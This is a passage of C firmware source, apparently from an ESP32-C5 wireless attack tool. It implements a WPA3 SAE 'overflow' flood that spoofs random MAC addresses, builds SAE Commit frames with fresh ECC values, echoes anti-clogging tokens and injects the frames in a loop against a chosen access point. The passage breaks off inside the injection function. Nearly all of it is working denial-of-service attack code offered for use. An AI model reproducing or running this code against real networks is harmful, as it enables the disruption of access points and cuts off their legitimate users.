Smethan/projectZero/ESP32C5/main/main.c
/*
 * Random MAC for client overflow attack.
 */
static void update_spoofed_src_random(void) {
    int ret;
#if HAS_MBEDTLS_CTR_DRBG
    ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
#else
    ret = trng_random_callback(NULL, spoofed_src, 6);
#endif
    if (ret != 0) {
        ESP_LOGE(TAG, "Unable to generate random MAC: %d", ret);
        return;
    }

    spoofed_src[0] &= 0xFE;  // bit multicast = 0
    spoofed_src[0] |= 0x02;  // locally administered = 1

    next_src = (next_src + 1) % NUM_CLIENTS;
}

// SAE Overflow attack task function (runs in background)
static void sae_attack_task(void *pvParameters) {
    wifi_ap_record_t *ap_record = (wifi_ap_record_t *)pvParameters;
    
    MY_LOG_INFO(TAG, "SAE overflow task started.");
    
    prepareAttack(*ap_record);
    int frame_count_check = 0;
    
    while (sae_attack_active) {
        // Check for stop request (check every 10 frames for better responsiveness)
        if (frame_count_check % 10 == 0) {
            if (operation_stop_requested || !sae_attack_active) {
                MY_LOG_INFO(TAG, "SAE overflow: Stop requested, terminating...");
                operation_stop_requested = false;
                sae_attack_active = false;
                applicationState = IDLE;
                
                // Clean up after attack
                esp_wifi_set_promiscuous(false);
                
                // Restore LED to idle (ignore errors if LED is in invalid state)
                esp_err_t led_err = led_set_idle();
                if (led_err != ESP_OK) {
                    ESP_LOGW(TAG, "Failed to restore idle LED after SAE stop: %s", esp_err_to_name(led_err));
                }
                
                break;
            }
            
            // Yield to allow UART console processing every 10 frames
            taskYIELD();
        }
        
        inject_sae_commit_frame();
        
        if (frame_count_check % 20 == 0) {
            char sae_l2[64], sae_l3[64];
            snprintf(sae_l2, sizeof(sae_l2), ">> %s", (const char *)ap_record->ssid);
            snprintf(sae_l3, sizeof(sae_l3), "  Frames: %d", frame_count_check);
            oled_display_update_full("> SAE Flood", sae_l2, sae_l3, "  WPA3 Overflow");
        }
        
        // Delay to allow UART console processing (50ms gives better responsiveness)
        vTaskDelay(pdMS_TO_TICKS(50));
        frame_count_check++;
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after SAE task: %s", esp_err_to_name(led_err));
    }
    
    // Clean up after attack
    esp_wifi_set_promiscuous(false);
    
    sae_attack_active = false;
    sae_attack_task_handle = NULL;
    MY_LOG_INFO(TAG, "SAE overflow task finished.");
    
    // Free the allocated memory for ap_record
    free(pvParameters);
    
    vTaskDelete(NULL); // Delete this task
}

/*
Injects SAE Commit frame with spoofed source address.
This function generates a random scalar, computes the corresponding ECC point,
and constructs the SAE Commit frame with the spoofed source address.
 */

void inject_sae_commit_frame() {
    uint8_t buf[256];  
    memset(buf, 0, sizeof(buf));
    memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
    memcpy(buf + 4, bssid, 6);
    memcpy(buf + 10, spoofed_src, 6);
    memcpy(buf + 16, bssid, 6);

    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;  // Placeholder: scalar size

    uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
    int ret;
    size_t scalar_size = 32;

    do {
#if HAS_MBEDTLS_CTR_DRBG
        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, mbedtls_ctr_drbg_random, &ctr_drbg);
#else
        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, trng_random_callback, NULL);
#endif
        if (ret != 0) {
            ESP_LOGE(TAG, "mbedtls_mpi_fill_random failed: %d", ret);
            return;
        }
    } while (mbedtls_mpi_cmp_int(&ecc_scalar, 0) <= 0 ||
             mbedtls_mpi_cmp_mpi(&ecc_scalar, &ecc_group.N) >= 0);

    ret = mbedtls_mpi_write_binary(&ecc_scalar, pos, scalar_size);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_mpi_write_binary failed: %d", ret);
        return;
    }
    pos += scalar_size;

#if HAS_MBEDTLS_CTR_DRBG
    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, mbedtls_ctr_drbg_random, &ctr_drbg);
#else
    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, trng_random_callback, NULL);
#endif
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_mul failed: %d", ret);
        return;
    }

    uint8_t point_buf[65];
    size_t point_len = 0;
    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED, &point_len, point_buf, sizeof(point_buf));
    if (ret != 0 || point_len != 65) {
        ESP_LOGE(TAG, "mbedtls_ecp_point_write_binary failed: %d", ret);
        return;
    }

    memcpy(pos, point_buf + 1, 64);  // skip 0x04 prefix
    pos += 64;

    // Append token:
    if (actLength > 0 && anti_clogging_token != NULL) {
        *pos++ = 0x4C;           // EID
        *pos++ = actLength;      // Length

        memcpy(pos, anti_clogging_token, actLength);
        pos += actLength;
    }

    // Refresh MAC
    update_spoofed_src_random();

    size_t total_len = pos - buf;


    esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
    if (ret_tx != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
    } else {
        //log the frame:
        //ESP_LOGD(TAG, "Injecting SAE Commit frame, total length: %d bytes", total_len);
        // for (size_t i = 0; i < total_len; i++) {
        //     printf("%02X ", buf[i]);
        // }
        //printf("\n");
        // Send the frame
    }

    if (frame_count == 0) start_time = esp_timer_get_time();
    frame_count++;

